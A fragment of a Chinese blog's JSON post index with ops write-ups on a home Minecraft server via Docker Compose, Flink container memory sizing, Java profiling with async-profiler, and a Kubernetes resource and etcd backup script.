default:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    name: milvus\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面的文件，MINIO_ACCESS_KEY和MINIO_SECRET_KEY已经被改掉了。\u003c/p\u003e","title":"Milvus生产环境搭建"},{"content":"儿子天天玩minecraft玩得不亦乐乎，就想自己搭个服务器，然后当家做主人\n于是乎，那就搭个吧，没想到还真不太容易，\n找到个网站：https://docker-minecraft-server.readthedocs.io/en/latest/\n用docker run吧死活跑不起来，大无语\n改用docker compose就一下起来了：\ndocker-compose.yaml\nservices: mc: image: itzg/minecraft-server:latest pull_policy: always tty: true stdin_open: true ports: - \u0026#34;25565:25565\u0026#34; environment: EULA: \u0026#34;TRUE\u0026#34; volumes: # attach the relative directory \u0026#39;data\u0026#39; to the container\u0026#39;s /data path - ./data:/data 注意：关键的一步来了，启动后，到docker compose的当前目录\nvi data/server.properties online-mode=false 否则客户端无法联上服务器。\n那客户端呢，直接下载这个启动器，然后不用下载任何java的东西\nhttps://webstatic.ctfile.com/assets/download/url94.ctfile.com/008854/HMCL-3.7.3.zip 打开后会自动下载java和客户端，然后连接服务器的25565端口，就可以愉快的玩耍了。\n","permalink":"https://rendoumi.com/posts/20251124-minecraft/","summary":"\u003cp\u003e儿子天天玩minecraft玩得不亦乐乎，就想自己搭个服务器，然后当家做主人\u003c/p\u003e\n\u003cp\u003e于是乎，那就搭个吧，没想到还真不太容易，\u003c/p\u003e\n\u003cp\u003e找到个网站：https://docker-minecraft-server.readthedocs.io/en/latest/\u003c/p\u003e\n\u003cp\u003e用docker run吧死活跑不起来，大无语\u003c/p\u003e\n\u003cp\u003e改用docker compose就一下起来了：\u003c/p\u003e\n\u003cp\u003edocker-compose.yaml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  mc:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: itzg/minecraft-server:latest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    pull_policy: always\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    tty: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    stdin_open: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;25565:25565\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      EULA: \u003cspan class=\"s2\"\u003e\u0026#34;TRUE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# attach the relative directory \u0026#39;data\u0026#39; to the container\u0026#39;s /data path\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - ./data:/data\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意：关键的一步来了，启动后，到docker compose的当前目录\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi data/server.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eonline-mode\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e否则客户端无法联上服务器。\u003c/p\u003e\n\u003cp\u003e那客户端呢，直接下载这个启动器，然后不用下载任何java的东西\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://webstatic.ctfile.com/assets/download/url94.ctfile.com/008854/HMCL-3.7.3.zip\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e打开后会自动下载java和客户端，然后连接服务器的25565端口，就可以愉快的玩耍了。\u003c/p\u003e","title":"Minecraft自建服务器的搭建"},{"content":"生产环境用到了Flink，那其实无论腾讯的flink还是aws的flink，都是运行在容器中的\n所以我们自建，也用容器，docker-compose.yaml一把梭\nservices: jobmanager: image: flink:1.17.1 ports: - \u0026#34;8081:8081\u0026#34; command: jobmanager environment: - | FLINK_PROPERTIES= jobmanager.memory.process.size: 4gb jobmanager.rpc.address: jobmanager taskmanager: image: flink:1.17.1 depends_on: - jobmanager command: taskmanager environment: - | FLINK_PROPERTIES= taskmanager.numberOfTaskSlots: 1 taskmanager.memory.process.size: 8gb jobmanager.rpc.address: jobmanager deploy: replicas: 1 注意啊，上面节点是16GB内存，所以job分了4G，然后task给了8G，TaskSlot给了1，副本也是1。内存富裕4G。是这么算的\n我们再看一个配置，是测试环境的，节点是32G：\nservices: jobmanager: image: flink:1.17.1 ports: - \u0026#34;8081:8081\u0026#34; command: jobmanager environment: - | FLINK_PROPERTIES= jobmanager.memory.process.size: 2gb jobmanager.rpc.address: jobmanager taskmanager: image: flink:1.17.1 depends_on: - jobmanager command: taskmanager environment: - | FLINK_PROPERTIES= taskmanager.numberOfTaskSlots: 4 taskmanager.memory.process.size: 8gb jobmanager.rpc.address: jobmanager deploy: replicas: 1 测试环境的内存就囧多了，jobmanager只给了2G，但是任务多且大，8G和Slot给了4，这个值是不断失败然后修改得到的\n我们上生产的时候要根据具体情况来动态调整。\n","permalink":"https://rendoumi.com/posts/20251121-flink_install/","summary":"\u003cp\u003e生产环境用到了Flink，那其实无论腾讯的flink还是aws的flink，都是运行在容器中的\u003c/p\u003e\n\u003cp\u003e所以我们自建，也用容器，docker-compose.yaml一把梭\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  jobmanager:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: flink:1.17.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;8081:8081\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eFLINK_PROPERTIES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          jobmanager.memory.process.size: 4gb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          jobmanager.rpc.address: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  taskmanager:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: flink:1.17.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    depends_on:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: taskmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eFLINK_PROPERTIES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        taskmanager.numberOfTaskSlots: \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        taskmanager.memory.process.size: 8gb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        jobmanager.rpc.address: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    deploy:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          replicas: \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意啊，上面节点是16GB内存，所以job分了4G，然后task给了8G，TaskSlot给了1，副本也是1。内存富裕4G。是这么算的\u003c/p\u003e\n\u003cp\u003e我们再看一个配置，是测试环境的，节点是32G：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  jobmanager:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: flink:1.17.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;8081:8081\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eFLINK_PROPERTIES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          jobmanager.memory.process.size: 2gb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          jobmanager.rpc.address: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  taskmanager:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: flink:1.17.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    depends_on:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: taskmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eFLINK_PROPERTIES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        taskmanager.numberOfTaskSlots: \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        taskmanager.memory.process.size: 8gb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        jobmanager.rpc.address: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    deploy:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          replicas: \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e测试环境的内存就囧多了，jobmanager只给了2G，但是任务多且大，8G和Slot给了4，这个值是不断失败然后修改得到的\u003c/p\u003e","title":"生产环境Flink的搭建"},{"content":"没办法了，被连续问到这个问题，必须讲一下了\njava程序写得不好，要么cpu高，要么内存高，内存可以不断扩大，我们的某个pod，已经扩到8G了，node总共才16G，无语啊。\n那究竟用啥玩意来排查呢？\n那必须推荐async-profiler了\n使用也很简单，运行排查即可\nmkdir -p /opt/app/profiler wget https://github.com/async-profiler/async-profiler/releases/download/v4.2/async-profiler-4.2-linux-x64.tar.gz tar zxvf async-profiler-4.2-linux-x64.tar.gz -C /opt/app/profiler --strip-components=1 命令很简单，关键是参数-e的选择：\n高 CPU 占用 (CPU-Bound)？缺省参数 首选： -e cpu 或 -e cycles 目标： 查看火焰图顶端最宽的方法，即消耗 CPU 最多的计算代码。 I/O 阻塞、锁等待或应用假死 (Latency/Blocking-Bound)？ 首选： -e wall 目标： 查找火焰图顶端长时间处于 BLOCKED 或 I/O 相关的代码块，找出阻塞的根源。 频繁 GC 或内存消耗过快？ 首选： -e alloc 目标： 找出哪些方法在短时间内创建了大量对象，导致年轻代 GC 频繁。 明确怀疑锁竞争？ 首选： -e lock 目标： 准确找出哪个锁是主要的竞争点。 那确定目标，cpu是缺省参数，所以可以直接运行\n./asprof -d 30 -f 1.html 1 解释，-d 分析实践30秒，-f输出的文件，最后的1是java的进程号，这样就生成了一个1.html的文件\n打开看看：\n看看底下那部分，kafka相关，点开动辄是63%之流的，说明都干这事了，去kafka里查询耗费了大量的cpu时间。\n然后再看看内存，再收集一波：\n./asprof -d 30 -e alloc -f 2.html 1 同样是kafka部分，又耗内存又耗CPU。唉，优化吧。\n","permalink":"https://rendoumi.com/posts/20251117-java_profile/","summary":"\u003cp\u003e没办法了，被连续问到这个问题，必须讲一下了\u003c/p\u003e\n\u003cp\u003ejava程序写得不好，要么cpu高，要么内存高，内存可以不断扩大，我们的某个pod，已经扩到8G了，node总共才16G，无语啊。\u003c/p\u003e\n\u003cp\u003e那究竟用啥玩意来排查呢？\u003c/p\u003e\n\u003cp\u003e那必须推荐\u003ccode\u003easync-profiler\u003c/code\u003e了\u003c/p\u003e\n\u003cp\u003e使用也很简单，运行排查即可\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /opt/app/profiler\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/async-profiler/async-profiler/releases/download/v4.2/async-profiler-4.2-linux-x64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf async-profiler-4.2-linux-x64.tar.gz -C /opt/app/profiler --strip-components\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e命令很简单，关键是参数-e的选择：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e高 CPU 占用 (CPU-Bound)？缺省参数\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e首选：\u003c/strong\u003e \u003ccode\u003e-e cpu\u003c/code\u003e 或 \u003ccode\u003e-e cycles\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e目标：\u003c/strong\u003e 查看火焰图顶端最宽的方法，即消耗 CPU 最多的计算代码。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eI/O 阻塞、锁等待或应用假死 (Latency/Blocking-Bound)？\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e首选：\u003c/strong\u003e \u003ccode\u003e-e wall\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e目标：\u003c/strong\u003e 查找火焰图顶端长时间处于 \u003ccode\u003eBLOCKED\u003c/code\u003e 或 I/O 相关的代码块，找出阻塞的根源。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e频繁 GC 或内存消耗过快？\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e首选：\u003c/strong\u003e \u003ccode\u003e-e alloc\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e目标：\u003c/strong\u003e 找出哪些方法在短时间内创建了大量对象，导致年轻代 GC 频繁。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e明确怀疑锁竞争？\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e首选：\u003c/strong\u003e \u003ccode\u003e-e lock\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e目标：\u003c/strong\u003e 准确找出哪个锁是主要的竞争点。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e那确定目标，cpu是缺省参数，所以可以直接运行\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./asprof -d \u003cspan class=\"m\"\u003e30\u003c/span\u003e -f 1.html \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释，-d 分析实践30秒，-f输出的文件，最后的1是java的进程号，这样就生成了一个1.html的文件\u003c/p\u003e\n\u003cp\u003e打开看看：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251117163547425\" loading=\"lazy\" src=\"/posts/20251117-java_profile/image-20251117163547425.png\"\u003e\u003c/p\u003e","title":"Java进程cpu高排查"},{"content":"这个问题其实比较有意思，同事早上用k9s修改Deployment的时候误删了一个deployment，这下麻烦了。那其实自己也有过类似操作，迁移的时候误删过influxdb，最后考古才弄回来，也误删过一个ns的secret，都是大麻烦！\n其实系统是有velero备份的，但是从那里面去弄出单独一个ns的deploy进行恢复，怎么也来不及，那幸好有每日资源备份，直接拿过来重建即可。分享一下脚本，那注意一下，因为主节点的etcd也是非常要命的东西，也必须备一下，防止主节点脑裂，到时候可以用备份进行恢复。\n#!/bin/bash export KUBECONFIG=/root/.kube/config export PATH=/usr/local/bin:$PATH # K8s 资源备份脚本 # 目标：遍历所有命名空间，将 Deployment, Secret, Ingress, 和 Service 导出为 YAML 文件。 # 设置输出目录 OUTPUT_DIR=\u0026#34;/root/k8s_deployments_backup/$(date +%Y%m%d)\u0026#34; # 要备份的资源类型及其对应的 kubectl 别名 # 注意：Secret 资源会备份所有类型，包括自动生成的 Service Account Tokens。 RESOURCE_TYPES=(\u0026#34;deployments\u0026#34; \u0026#34;secrets\u0026#34; \u0026#34;ingresses\u0026#34; \u0026#34;services\u0026#34;) # 确保脚本在遇到错误时立即退出 set -e echo \u0026#34;--- 正在创建输出目录: $OUTPUT_DIR ---\u0026#34; mkdir -p \u0026#34;$OUTPUT_DIR\u0026#34; # ---------------------------------------------------- # 核心函数：备份指定类型的资源 # 参数: $1 = 资源类型 (如 deployment), $2 = 命名空间, $3 = 输出目录 # ---------------------------------------------------- backup_resource() { local TYPE=$1 local NAMESPACE=$2 local DIR=$3 # 获取当前命名空间中所有该类型资源的名称 # 使用 2\u0026gt;/dev/null 隐藏找不到资源时的错误信息 local RESOURCES=$(kubectl get \u0026#34;$TYPE\u0026#34; -n \u0026#34;$NAMESPACE\u0026#34; -o jsonpath=\u0026#39;{.items[*].metadata.name}\u0026#39; 2\u0026gt;/dev/null) if [ -z \u0026#34;$RESOURCES\u0026#34; ]; then echo \u0026#34; [信息] 命名空间 $NAMESPACE 中未找到 $TYPE。\u0026#34; return fi echo \u0026#34; -\u0026gt; 找到 ${#RESOURCES[@]} 个 $TYPE，正在导出...\u0026#34; # 遍历每个资源并保存 YAML for RESOURCE in $RESOURCES; do # 文件名格式: namespace-resource_type-resourcename.yaml local FILE_NAME=\u0026#34;${NAMESPACE}-${TYPE}-${RESOURCE}.yaml\u0026#34; local FILE_PATH=\u0026#34;$DIR/$FILE_NAME\u0026#34; # 使用 kubectl get 获取 YAML，并通过管道和 sed 清理元数据字段 kubectl get \u0026#34;$TYPE\u0026#34; \u0026#34;$RESOURCE\u0026#34; -n \u0026#34;$NAMESPACE\u0026#34; -o yaml --ignore-not-found | # 清理元数据字段，使 YAML 更干净，便于重新应用 sed \u0026#39;/^ creationTimestamp:/d\u0026#39; | sed \u0026#39;/^ resourceVersion:/d\u0026#39; | sed \u0026#39;/^ uid:/d\u0026#39; | sed \u0026#39;/^ selfLink:/d\u0026#39; | sed \u0026#39;/^ status:/d\u0026#39; \\ \u0026gt; \u0026#34;$FILE_PATH\u0026#34; # 检查 Secret 是否为 Service Account Token，如果是，则发出警告 if [ \u0026#34;$TYPE\u0026#34; == \u0026#34;secrets\u0026#34; ] \u0026amp;\u0026amp; grep -q \u0026#39;kubernetes.io/service-account.name\u0026#39; \u0026#34;$FILE_PATH\u0026#34;; then echo \u0026#34; [警告] Secret $RESOURCE 是 Service Account Token，通常不需要备份。\u0026#34; fi done } # 1. 获取所有命名空间 (Namespace) NAMESPACES=$(kubectl get ns -o jsonpath=\u0026#39;{.items[*].metadata.name}\u0026#39;) if [ -z \u0026#34;$NAMESPACES\u0026#34; ]; then echo \u0026#34;错误：未找到任何命名空间。请检查 kubectl 配置和集群连接。\u0026#34; exit 1 fi echo \u0026#34;找到以下命名空间: $NAMESPACES\u0026#34; echo \u0026#34;----------------------------------------------------\u0026#34; # 2. 遍历每个命名空间和资源类型 for NAMESPACE in $NAMESPACES; do echo \u0026#34;--- 处理命名空间: $NAMESPACE ---\u0026#34; for TYPE in \u0026#34;${RESOURCE_TYPES[@]}\u0026#34;; do backup_resource \u0026#34;$TYPE\u0026#34; \u0026#34;$NAMESPACE\u0026#34; \u0026#34;$OUTPUT_DIR\u0026#34; done echo \u0026#34;--- 命名空间 $NAMESPACE 处理完成 ---\u0026#34; done ETCDCTL_API=3 etcdctl \\ --endpoints=https://10.10.240.3:2379 \\ --cacert=/etc/ssl/etcd/ca.pem \\ --cert=/etc/ssl/etcd/etcd-client.pem \\ --key=/etc/ssl/etcd/etcd-client-key.pem \\ snapshot save $OUTPUT_DIR/etcd-`date +%Y%m%d`-snapshot.db echo \u0026#34;====================================================\u0026#34; echo \u0026#34;✅ 所有指定资源已成功备份到目录: $OUTPUT_DIR\u0026#34; echo \u0026#34;====================================================\u0026#34; exit 0 ","permalink":"https://rendoumi.com/posts/20251117-k8s_resource_backup/","summary":"\u003cp\u003e这个问题其实比较有意思，同事早上用k9s修改Deployment的时候误删了一个deployment，这下麻烦了。那其实自己也有过类似操作，迁移的时候误删过influxdb，最后考古才弄回来，也误删过一个ns的secret，都是大麻烦！\u003c/p\u003e\n\u003cp\u003e其实系统是有velero备份的，但是从那里面去弄出单独一个ns的deploy进行恢复，怎么也来不及，那幸好有每日资源备份，直接拿过来重建即可。分享一下脚本，那注意一下，因为主节点的etcd也是非常要命的东西，也必须备一下，防止主节点脑裂，到时候可以用备份进行恢复。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eKUBECONFIG\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/root/.kube/config\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# K8s 资源备份脚本\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 目标：遍历所有命名空间，将 Deployment, Secret, Ingress, 和 Service 导出为 YAML 文件。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 